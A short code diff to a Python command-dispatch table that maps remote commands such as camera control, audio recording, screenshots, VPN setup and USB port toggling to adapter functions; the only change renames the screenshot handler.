@@ -8,7 +8,7 @@ COMMAND_HANDLERS = {
     "stop_camera": camera_adapter.stop_camera_stream,
     "capture_frame": camera_adapter.capture_frame,
     "record_audio": send_recorded_audio.send_recorded_audio,
-    "screenshot": screenshot_adapter.take_screenshot,
+    "screenshot": screenshot_adapter.screenshot,
     "create_vpn": vpn_connection.create_vpn_connection,
     "enable_usb": usb_ports.enable_usb_ports,    # включение USB-портов
     "disable_usb": usb_ports.disable_usb_ports,  # отключение USB-портов
